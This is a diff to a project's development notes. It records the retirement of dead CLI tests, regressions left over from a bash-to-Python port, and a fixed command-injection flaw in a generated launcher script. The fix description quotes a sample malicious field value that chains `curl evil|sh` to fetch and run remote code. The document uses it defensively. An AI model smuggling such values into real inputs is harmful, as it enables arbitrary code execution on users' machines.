@@ -35,27 +35,26 @@ pinning with structural guards derived from source: every path-like README ref m
 resolve, every Caddyfile `handle` must appear in the routing table, and every
 model-manager case arm must appear in `--help`.
 
+### Retire the CLI test suite's dead generation
+UI is the direction; the CLI is legacy. Deleted the tests for `benchmark` (22 call
+sites), `select` (9) and `discover` (5) — 529 lines — and rewrote the `accept` block
+(573 lines to 105) against the Python implementation that actually runs. Suite is
+green for the first time since June.
+
+Fixing it surfaced a command-injection hole in `_do_accept`: `repo` and `hf_file`
+were interpolated unquoted into a generated launcher that is then chmod +x, and
+`family` formed a filesystem path before `write_accepted()`'s check ran. A benchmark
+JSON with `repo: "x; curl evil|sh #"` produced a launcher that ran it. The bash
+implementation validated these; the port dropped it. `_validate_accept_fields()` now
+rejects every interpolated field before anything is written, with regression tests.
+
+Remaining, not blocking: the Python `cmd_list` prints only accepted models, where the
+bash one also showed Profiles / Launchers / Pending Selections / Remote Cache.
+Pending selections are invisible from the CLI. `MODEL_MANAGER_PY` is hardcoded
+(`scripts/model-manager.sh:22`) so the bash fallbacks holding those features are
+unreachable dead code — delete them or restore the features.
+
 ## Pending
-
-### test_oc_local.sh still tests a removed CLI generation
-The doc-guard problem is fixed, but the suite is not green. It still invokes three
-subcommands that no longer exist — `benchmark` (22 call sites), `select` (9),
-`discover` (5) — replaced by the `search` → `install` → `accept` workflow. Every
-assertion hanging off them is dead.
-
-**This is a product decision, not cleanup, which is why it is not done:** deleting
-those blocks bakes in "benchmarking is UI-only". The alternative is restoring CLI
-parity. Pick one before touching them.
-
-Related regressions found while unblocking the suite, all from the bash→Python port:
-- `cmd_list` in `scripts/model_manager/commands.py` prints only accepted models. The
-  bash `cmd_list` also printed Profiles / Launchers / Pending Selections / Remote
-  Cache, including a remote cache inventory over ssh. Pending selections are now
-  invisible from the CLI.
-- `MODEL_MANAGER_PY` is hardcoded (`scripts/model-manager.sh:22`), so the bash
-  `cmd_list`/`cmd_status` fallbacks are unreachable in any real checkout — dead code
-  carrying the only implementation of the features above.
-
 
 ### Warn on unknown profile fields
 Log warning when saving profile with unrecognized fields that `runtime.py` will silently ignore (e.g., typo'd `mtp_enabled` → `mtp_enable`). Prevent silent no-ops.
